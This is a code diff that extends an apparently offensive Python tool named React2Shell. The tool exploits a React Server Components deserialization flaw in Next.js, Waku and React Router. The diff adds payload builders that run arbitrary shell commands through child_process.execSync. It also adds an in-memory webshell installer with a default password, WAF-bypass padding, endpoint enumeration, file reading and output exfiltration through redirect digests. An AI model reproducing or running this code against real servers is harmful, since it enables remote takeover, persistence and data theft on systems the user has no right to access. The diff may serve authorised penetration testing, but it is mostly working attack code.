@@ -64,8 +64,80 @@ VULNERABLE_VERSIONS = {
         "ranges": [
             ("19.0.0", "19.2.0", "19.2.1"),    # React 19.0.0-19.2.0
         ]
+    },
+    "waku": {
+        "ranges": [
+            ("0.0.0", "0.27.1", "0.27.2"),     # All Waku versions before 0.27.2
+        ]
+    },
+    "react-router": {
+        "ranges": [
+            ("7.0.0", "7.5.0", "7.5.1"),       # React Router with RSC preview
+        ]
     }
 }
+
+# =============================================================================
+# FRAMEWORK-SPECIFIC RSC ENDPOINTS
+# =============================================================================
+
+# Framework detection and RSC endpoint patterns
+FRAMEWORK_ENDPOINTS = {
+    "nextjs": {
+        "name": "Next.js",
+        "paths": ["/", "/api", "/dashboard", "/admin", "/login", "/app"],
+        "indicators": ["_next", "Next.js", "__NEXT_DATA__"],
+        "headers": {"Next-Action": True, "X-Nextjs-Request-Id": True},
+    },
+    "react-router": {
+        "name": "React Router",
+        "paths": ["/_rsc", "/rsc", "/__rsc", "/action", "/_action"],
+        "indicators": ["react-router", "remix"],
+        "headers": {"X-React-Router-Action": True},
+    },
+    "waku": {
+        "name": "Waku",
+        "paths": ["/RSC/F/action/run.txt", "/RSC/F/_action/run.txt", "/RSC/F/rpc/call.txt"],
+        "indicators": ["waku", "Waku"],
+        "headers": {},
+        "random_endpoint": True,  # Waku uses randomly generated endpoints
+    },
+    "expo": {
+        "name": "Expo",
+        "paths": ["/_expo/rsc", "/expo/_rsc", "/_rsc", "/rsc"],
+        "indicators": ["expo", "Expo"],
+        "headers": {},
+    },
+    "vite-rsc": {
+        "name": "Vite RSC Plugin",
+        "paths": ["/__rsc", "/_rsc", "/rsc"],
+        "indicators": ["vite", "@vitejs/plugin-rsc"],
+        "headers": {},
+    },
+    "parcel-rsc": {
+        "name": "Parcel RSC",
+        "paths": ["/__parcel_rsc", "/_rsc", "/rsc"],
+        "indicators": ["parcel", "@parcel/rsc"],
+        "headers": {},
+    },
+    "redwood": {
+        "name": "RedwoodJS",
+        "paths": ["/.redwood/functions", "/api/rsc", "/_rsc"],
+        "indicators": ["redwood", "rwsdk"],
+        "headers": {},
+    },
+}
+
+# Common RSC endpoint wordlist for enumeration
+RSC_ENDPOINT_WORDLIST = [
+    "/", "/_rsc", "/rsc", "/__rsc", "/RSC/",
+    "/action", "/_action", "/__action",
+    "/api", "/api/rsc", "/api/action",
+    "/app", "/dashboard", "/admin", "/login", "/settings",
+    "/_expo/rsc", "/expo/_rsc",
+    "/__RSC__/", "/waku/", "/_waku/rsc",
+    "/__parcel_rsc", "/.redwood/functions",
+]
 
 
 # =============================================================================
@@ -520,6 +592,297 @@ def build_check_payload() -> Tuple[str, str, str]:
     return body, content_type, str(expected)
 
 
+def build_waku_payload(cmd: str, windows: bool = False, waf_bypass: bool = False,
+                       waf_size_kb: int = 128) -> Tuple[str, str]:
+    """
+    Build Waku-specific RCE payload.
+    Waku requires path format: /RSC/F/{file}/{name}.txt for function calls.
+    Uses process.getBuiltinModule for ESM compatibility (Node.js 20.16+).
+
+    Note: Waku doesn't expose error digest in HTTP response, so output
+    exfiltration requires file write + read or out-of-band methods.
+    For CLI, we write output to /tmp/r2s_out.txt and read it back.
+    """
+    boundary = random_boundary()
+    boundary_clean = boundary.replace("----", "")
+
+    # Escape for shell command (single quotes)
+    cmd_escaped = cmd.replace("'", "'\"'\"'")
+    if windows:
+        exec_cmd = f"powershell -c '{cmd_escaped}'"
+    else:
+        exec_cmd = cmd_escaped
+
+    # Waku payload - writes output to file since Waku doesn't expose digest in response
+    # Use getBuiltinModule for ESM compatibility
+    prefix_code = (
+        f"var cp=process.getBuiltinModule?process.getBuiltinModule('child_process'):"
+        f"process.mainModule.require('child_process');"
+        f"var fs=process.getBuiltinModule?process.getBuiltinModule('fs'):"
+        f"process.mainModule.require('fs');"
+        f"var res=cp.execSync('{exec_cmd}').toString();"
+        f"fs.writeFileSync('/tmp/r2s_out.txt',res);"
+        f"throw new Error('RCE_DONE')//"
+    )
+
+    # Build payload as proper dict and serialize with json.dumps for correct escaping
+    part0_obj = {
+        "then": "$1:__proto__:then",
+        "status": "resolved_model",
+        "reason": -1,
+        "value": '{"then":"$B1337"}',
+        "_response": {
+            "_prefix": prefix_code,
+            "_chunks": "$Q2",
+            "_formData": {
+                "get": "$1:constructor:constructor"
+            }
+        }
+    }
+    part0 = json.dumps(part0_obj)
+
+    body_parts = []
+    if waf_bypass:
+        junk_name = random_string(12, string.ascii_lowercase)
+        junk_data = random_string(waf_size_kb * 1024)
+        body_parts.extend([
+            f"--{boundary_clean}",
+            f'Content-Disposition: form-data; name="{junk_name}"',
+            "",
+            junk_data
+        ])
+
+    body_parts.extend([
+        f"--{boundary_clean}",
+        'Content-Disposition: form-data; name="0"',
+        "",
+        part0,
+        f"--{boundary_clean}",
+        'Content-Disposition: form-data; name="1"',
+        "",
+        '"$@0"',
+        f"--{boundary_clean}",
+        'Content-Disposition: form-data; name="2"',
+        "",
+        "[]",
+        f"--{boundary_clean}--"
+    ])
+
+    body = "\r\n".join(body_parts)
+    content_type = f"multipart/form-data; boundary={boundary_clean}"
+    return body, content_type
+
+
+def build_webshell_payload(password: str = "react2shell") -> Tuple[str, str]:
+    """
+    Build in-memory webshell payload for persistence.
+    Injects a hidden webshell that persists in server memory.
+    Access via: POST /?shell=<password>&cmd=<command>
+    """
+    boundary = random_boundary()
+    boundary_clean = boundary.replace("----", "")
+
+    # In-memory webshell - hooks into request handler
+    webshell_code = (
+        f"if(!global._r2s){{global._r2s=true;"
+        f"var http=process.mainModule.require('http');"
+        f"var orig=http.createServer;"
+        f"http.createServer=function(h){{return orig(function(q,s){{"
+        f"if(q.url&&q.url.includes('shell={password}')){{var u=new URL(q.url,'http://x');"
+        f"var c=u.searchParams.get('cmd');"
+        f"if(c){{var r=process.mainModule.require('child_process').execSync(c).toString();"
+        f"s.writeHead(200);s.end(r);return;}}}}"
+        f"return h(q,s);}})}};}};"
+        f"throw Object.assign(new Error('NEXT_REDIRECT'),"
+        f"{{digest:'NEXT_REDIRECT;push;/shell-installed;307;'}});"
+    )
+
+    part0 = (
+        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
+        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
+        + webshell_code + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
+    )
+
+    body = "\r\n".join([
+        f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{part0}",
+        f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"",
+        f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]",
+        f"--{boundary_clean}--"
+    ])
+
+    content_type = f"multipart/form-data; boundary={boundary_clean}"
+    return body, content_type
+
+
+def build_react_router_payload(cmd: str, windows: bool = False) -> Tuple[str, str]:
+    """
+    Build React Router RSC payload.
+    Uses process.getBuiltinModule for ESM compatibility (Node.js 20.16+).
+    Falls back to process.mainModule.require for CommonJS environments.
+    """
+    boundary = random_boundary()
+    boundary_clean = boundary.replace("----", "")
+
+    # Escape for shell command (single quotes)
+    cmd_escaped = cmd.replace("'", "'\"'\"'")
+    if windows:
+        exec_cmd = f"powershell -c '{cmd_escaped}'"
+    else:
+        exec_cmd = cmd_escaped
+
+    # Use process.getBuiltinModule for ESM (Node 20.16+), fallback to mainModule.require for CJS
+    prefix_code = (
+        f"var cp=process.getBuiltinModule?process.getBuiltinModule('child_process'):"
+        f"process.mainModule.require('child_process');"
+        f"var res=cp.execSync('{exec_cmd}').toString().trim();"
+        f"var encoded=Buffer.from(res).toString('base64');"
+        f"throw Object.assign(new Error('REDIRECT'),"
+        f"{{digest:'REDIRECT;push;/login?a='+encoded+';307;'}})//"
+    )
+
+    # Build payload as a proper dict and serialize with json.dumps for correct escaping
+    part0_obj = {
+        "then": "$1:__proto__:then",
+        "status": "resolved_model",
+        "reason": -1,
+        "value": '{"then":"$B1337"}',
+        "_response": {
+            "_prefix": prefix_code,
+            "_chunks": "$Q2",
+            "_formData": {
+                "get": "$1:constructor:constructor"
+            }
+        }
+    }
+    part0 = json.dumps(part0_obj)
+
+    body = "\r\n".join([
+        f"--{boundary_clean}",
+        'Content-Disposition: form-data; name="0"',
+        "",
+        part0,
+        f"--{boundary_clean}",
+        'Content-Disposition: form-data; name="1"',
+        "",
+        '"$@0"',
+        f"--{boundary_clean}",
+        'Content-Disposition: form-data; name="2"',
+        "",
+        "[]",
+        f"--{boundary_clean}--"
+    ])
+
+    content_type = f"multipart/form-data; boundary={boundary_clean}"
+    return body, content_type
+
+
+# =============================================================================
+# FRAMEWORK DETECTION & ENDPOINT ENUMERATION
+# =============================================================================
+
+def detect_framework(url: str, timeout: int = 5) -> Tuple[str, List[str]]:
+    """
+    Detect which RSC framework is running on the target.
+    Returns (framework_name, suggested_paths).
+    """
+    url = normalize_url(url)
+    detected = "unknown"
+    suggested_paths = RSC_ENDPOINT_WORDLIST.copy()
+
+    try:
+        response = requests.get(
+            url,
+            timeout=timeout,
+            verify=False,
+            headers={"User-Agent": "Mozilla/5.0 React2Shell/2.0"}
+        )
+
+        headers_lower = {k.lower(): v for k, v in response.headers.items()}
+        body = response.text.lower()
+
+        # Check each framework's indicators
+        for fw_key, fw_config in FRAMEWORK_ENDPOINTS.items():
+            for indicator in fw_config["indicators"]:
+                if indicator.lower() in body or indicator.lower() in str(headers_lower):
+                    detected = fw_key
+                    suggested_paths = fw_config["paths"] + RSC_ENDPOINT_WORDLIST
+                    break
+            if detected != "unknown":
+                break
+
+        # Check headers for Next.js specifically
+        if "x-powered-by" in headers_lower and "next" in headers_lower["x-powered-by"].lower():
+            detected = "nextjs"
+            suggested_paths = FRAMEWORK_ENDPOINTS["nextjs"]["paths"] + RSC_ENDPOINT_WORDLIST
+
+    except Exception:
+        pass
+
+    return detected, list(dict.fromkeys(suggested_paths))  # Remove duplicates
+
+
+def enumerate_rsc_endpoints(url: str, paths: List[str] = None, timeout: int = 5,
+                            threads: int = 10, verbose: bool = False) -> List[Dict]:
+    """
+    Enumerate valid RSC endpoints on a target.
+    Returns list of discovered endpoints with their status.
+    """
+    url = normalize_url(url)
+    paths = paths or RSC_ENDPOINT_WORDLIST
+    results = []
+
+    def check_endpoint(path: str) -> Optional[Dict]:
+        target = f"{url}{path}"
+        try:
+            # Send a minimal RSC-like request to see if endpoint responds
+            headers = {
+                "User-Agent": "Mozilla/5.0 React2Shell/2.0",
+                "Content-Type": "multipart/form-data; boundary=----test",
+                "Next-Action": "test",
+            }
+            response = requests.post(
+                target,
+                headers=headers,
+                data="------test\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{}\r\n------test--",
+                timeout=timeout,
+                verify=False
+            )
+
+            # RSC endpoints typically return specific status codes or headers
+            is_rsc = (
+                response.status_code in [200, 303, 307, 400, 500] and
+                (
+                    "x-action-redirect" in response.headers or
+                    "text/x-component" in response.headers.get("content-type", "") or
+                    response.status_code == 500  # RSC often errors on malformed input
+                )
+            )
+
+            if is_rsc or response.status_code != 404:
+                return {
+                    "path": path,
+                    "url": target,
+                    "status": response.status_code,
+                    "likely_rsc": is_rsc,
+                    "content_type": response.headers.get("content-type", ""),
+                }
+        except Exception:
+            pass
+        return None
+
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = {executor.submit(check_endpoint, p): p for p in paths}
+        for future in as_completed(futures):
+            result = future.result()
+            if result:
+                results.append(result)
+                if verbose:
+                    status = "RSC" if result["likely_rsc"] else "OK"
+                    print(Colors.info(f"Found: {result['path']} [{result['status']}] ({status})"))
+
+    return sorted(results, key=lambda x: (not x["likely_rsc"], x["status"]))
+
+
 # =============================================================================
 # REVERSE SHELL
 # =============================================================================
@@ -597,21 +960,37 @@ class React2Shell:
         import urllib3
         urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-    def _build_headers(self, content_type: str) -> dict:
-        """Build request headers."""
+    def _build_headers(self, content_type: str, framework: str = "nextjs") -> dict:
+        """Build request headers based on framework."""
         headers = {
             "User-Agent": self.user_agent,
-            "Next-Action": random_string(random.randint(1, 10), string.ascii_lowercase + string.digits),
-            "X-Nextjs-Request-Id": random_hex(8),
             "Content-Type": content_type,
-            "X-Nextjs-Html-Request-Id": random_string(21),
         }
+
+        # Framework-specific headers
+        if framework in ("nextjs", "auto"):
+            headers["Next-Action"] = random_string(random.randint(1, 10), string.ascii_lowercase + string.digits)
+            headers["X-Nextjs-Request-Id"] = random_hex(8)
+            headers["X-Nextjs-Html-Request-Id"] = random_string(21)
+        elif framework == "waku":
+            headers["Accept"] = "text/x-component"
+            headers["rsc-action-id"] = random_string(8, string.ascii_lowercase + string.digits)
+        elif framework == "react-router":
+            headers["Accept"] = "text/x-component"
+            headers["X-React-Router-Action"] = random_string(8, string.ascii_lowercase + string.digits)
+        elif framework in ("vite-rsc", "parcel-rsc"):
+            headers["Accept"] = "text/x-component"
+            headers["rsc-action-id"] = random_string(8, string.ascii_lowercase + string.digits)
+        else:
+            # Default to Next.js style headers
+            headers["Next-Action"] = random_string(random.randint(1, 10), string.ascii_lowercase + string.digits)
+
         headers.update(self.custom_headers)
         return headers
 
-    def _send_request(self, url: str, body: str, content_type: str) -> Tuple[Optional[requests.Response], Optional[str]]:
+    def _send_request(self, url: str, body: str, content_type: str, framework: str = "nextjs") -> Tuple[Optional[requests.Response], Optional[str]]:
         """Send exploit request."""
-        headers = self._build_headers(content_type)
+        headers = self._build_headers(content_type, framework)
         try:
             response = requests.post(
                 url,
@@ -752,18 +1131,28 @@ class React2Shell:
     def execute(self, url: str, cmd: str, path: str = "/",
                 windows: bool = False, waf_bypass: bool = False,
                 waf_size_kb: int = 128, vercel_bypass: bool = False,
-                unicode_bypass: bool = False) -> Tuple[bool, str, int]:
+                unicode_bypass: bool = False, framework: str = "nextjs") -> Tuple[bool, str, int]:
         """Execute command on vulnerable target."""
         url = normalize_url(url)
         target = f"{url}{path}"
 
-        body, content_type = build_rce_payload(
-            cmd, windows=windows, waf_bypass=waf_bypass,
-            waf_size_kb=waf_size_kb, vercel_bypass=vercel_bypass,
-            unicode_bypass=unicode_bypass
-        )
+        # Use framework-specific payload builder
+        if framework == "waku":
+            body, content_type = build_waku_payload(
+                cmd, windows=windows, waf_bypass=waf_bypass,
+                waf_size_kb=waf_size_kb
+            )
+        elif framework == "react-router":
+            body, content_type = build_react_router_payload(cmd, windows=windows)
+        else:
+            # Default to Next.js payload (works for most frameworks)
+            body, content_type = build_rce_payload(
+                cmd, windows=windows, waf_bypass=waf_bypass,
+                waf_size_kb=waf_size_kb, vercel_bypass=vercel_bypass,
+                unicode_bypass=unicode_bypass
+            )
 
-        response, error = self._send_request(target, body, content_type)
+        response, error = self._send_request(target, body, content_type, framework)
 
         if error:
             return False, error, 0
@@ -774,14 +1163,14 @@ class React2Shell:
     def read_file(self, url: str, file_path: str, path: str = "/",
                   windows: bool = False, waf_bypass: bool = False,
                   waf_size_kb: int = 128, vercel_bypass: bool = False,
-                  unicode_bypass: bool = False) -> Tuple[bool, str, int]:
+                  unicode_bypass: bool = False, framework: str = "nextjs") -> Tuple[bool, str, int]:
         """Read a file from the target system."""
         if windows:
             cmd = f"type {file_path}"
         else:
             cmd = f"cat {file_path}"
         return self.execute(url, cmd, path, windows, waf_bypass, waf_size_kb,
-                          vercel_bypass, unicode_bypass)
+                          vercel_bypass, unicode_bypass, framework)
 
     def reverse_shell(self, url: str, lhost: str, lport: int,
                       shell_type: str = "nc-mkfifo", path: str = "/",
@@ -847,7 +1236,7 @@ class React2Shell:
     def interactive_shell(self, url: str, path: str = "/",
                          windows: bool = False, waf_bypass: bool = False,
                          waf_size_kb: int = 128, vercel_bypass: bool = False,
-                         unicode_bypass: bool = False):
+                         unicode_bypass: bool = False, framework: str = "nextjs"):
         """Start an interactive command shell."""
         url = normalize_url(url)
         target = f"{url}{path}"
@@ -923,7 +1312,7 @@ class React2Shell:
                 # Execute command
                 success, output, status = self.execute(
                     url, cmd, path, windows, waf_bypass,
-                    waf_size_kb, vercel_bypass, unicode_bypass
+                    waf_size_kb, vercel_bypass, unicode_bypass, framework
                 )
 
                 if success:
@@ -1165,6 +1554,29 @@ Examples:
         metavar="PATH",
         help="Scan local project directory for vulnerable versions"
     )
+    scan_group.add_argument(
+        "-F", "--framework",
+        choices=["auto", "nextjs", "react-router", "waku", "expo", "vite-rsc", "parcel-rsc", "redwood"],
+        default="auto",
+        help="Target framework (default: auto-detect)"
+    )
+    scan_group.add_argument(
+        "-E", "--enumerate",
+        action="store_true",
+        help="Enumerate RSC endpoints before exploitation"
+    )
+    scan_group.add_argument(
+        "--detect",
+        action="store_true",
+        help="Only detect framework and list suggested endpoints"
+    )
+    scan_group.add_argument(
+        "--webshell",
+        metavar="PASSWORD",
+        nargs="?",
+        const="react2shell",
+        help="Install in-memory webshell (default password: react2shell)"
+    )
 
     # Bypass options
     bypass_group = parser.add_argument_group("Bypass Options")
@@ -1325,6 +1737,88 @@ Examples:
             if version_info.get("server"):
                 print(Colors.info(f"Server: {version_info['server']}"))
 
+    # Framework detection mode
+    if args.detect:
+        for target in targets:
+            print(Colors.info(f"Detecting framework on {target}..."))
+            framework, suggested_paths = detect_framework(target, timeout=args.timeout)
+            print(Colors.success(f"Detected framework: {FRAMEWORK_ENDPOINTS.get(framework, {}).get('name', 'Unknown')}"))
+            print(Colors.info(f"Suggested endpoints to test:"))
+            for p in suggested_paths[:15]:  # Show top 15
+                print(f"  {p}")
+        sys.exit(0)
+
+    # Auto-detect framework and adjust paths
+    # Store detected framework for use in command execution
+    detected_framework = args.framework
+    if args.framework == "auto" and len(targets) == 1:
+        framework, suggested_paths = detect_framework(targets[0], timeout=args.timeout)
+        if framework != "unknown":
+            detected_framework = framework
+            if not args.quiet:
+                print(Colors.info(f"Auto-detected framework: {FRAMEWORK_ENDPOINTS.get(framework, {}).get('name', framework)}"))
+        if args.path == "/" and suggested_paths:
+            paths = suggested_paths[:10]  # Use suggested paths if default
+    elif args.framework != "auto":
+        detected_framework = args.framework
+        # Use framework-specific paths
+        fw_config = FRAMEWORK_ENDPOINTS.get(args.framework, {})
+        if fw_config and args.path == "/":
+            paths = fw_config.get("paths", []) + ["/"]
+            if not args.quiet:
+                print(Colors.info(f"Using {fw_config.get('name', args.framework)} paths"))
+
+    # Endpoint enumeration mode
+    if args.enumerate:
+        for target in targets:
+            print(Colors.info(f"Enumerating RSC endpoints on {target}..."))
+            endpoints = enumerate_rsc_endpoints(
+                target, paths=RSC_ENDPOINT_WORDLIST,
+                timeout=args.timeout, threads=args.threads,
+                verbose=args.verbose
+            )
+            if endpoints:
+                print(Colors.success(f"Found {len(endpoints)} potential endpoints:"))
+                for ep in endpoints:
+                    marker = Colors.RED + "[RSC]" + Colors.RESET if ep["likely_rsc"] else "[OK]"
+                    print(f"  {marker} {ep['path']} (Status: {ep['status']})")
+                # Update paths with discovered RSC endpoints
+                rsc_paths = [ep["path"] for ep in endpoints if ep["likely_rsc"]]
+                if rsc_paths:
+                    paths = rsc_paths
+                    print(Colors.info(f"Using {len(rsc_paths)} discovered RSC endpoints for scanning"))
+            else:
+                print(Colors.warning("No RSC endpoints found"))
+        if not args.cmd and not args.interactive:
+            sys.exit(0)
+
+    # Webshell installation mode
+    if args.webshell:
+        password = args.webshell
+        print(Colors.warning(f"Installing in-memory webshell (password: {password})..."))
+        for target in targets:
+            for path in paths:
+                body, content_type = build_webshell_payload(password)
+                headers = scanner._build_headers(content_type)
+                try:
+                    response = requests.post(
+                        f"{normalize_url(target)}{path}",
+                        headers=headers,
+                        data=body.encode('utf-8'),
+                        timeout=scanner.timeout,
+                        verify=scanner.verify_ssl,
+                        allow_redirects=False,
+                        proxies=scanner.proxies
+                    )
+                    if response.status_code in [303, 307] or "shell-installed" in response.headers.get("X-Action-Redirect", ""):
+                        print(Colors.success(f"Webshell installed on {target}"))
+                        print(Colors.info(f"Access via: curl '{target}/?shell={password}&cmd=id'"))
+                    else:
+                        print(Colors.error(f"Failed to install webshell on {target} (Status: {response.status_code})"))
+                except Exception as e:
+                    print(Colors.error(f"Error: {e}"))
+        sys.exit(0)
+
     # Interactive shell mode
     if args.interactive:
         if len(targets) > 1:
@@ -1336,7 +1830,8 @@ Examples:
             waf_bypass=args.waf_bypass,
             waf_size_kb=args.waf_size,
             vercel_bypass=args.vercel_bypass,
-            unicode_bypass=args.unicode
+            unicode_bypass=args.unicode,
+            framework=detected_framework if detected_framework != "auto" else "nextjs"
         )
         sys.exit(0)
 
@@ -1368,7 +1863,8 @@ Examples:
                     waf_bypass=args.waf_bypass,
                     waf_size_kb=args.waf_size,
                     vercel_bypass=args.vercel_bypass,
-                    unicode_bypass=args.unicode
+                    unicode_bypass=args.unicode,
+                    framework=detected_framework if detected_framework != "auto" else "nextjs"
                 )
 
                 if success:
@@ -1392,7 +1888,8 @@ Examples:
                     waf_bypass=args.waf_bypass,
                     waf_size_kb=args.waf_size,
                     vercel_bypass=args.vercel_bypass,
-                    unicode_bypass=args.unicode
+                    unicode_bypass=args.unicode,
+                    framework=detected_framework if detected_framework != "auto" else "nextjs"
                 )
 
                 if success:
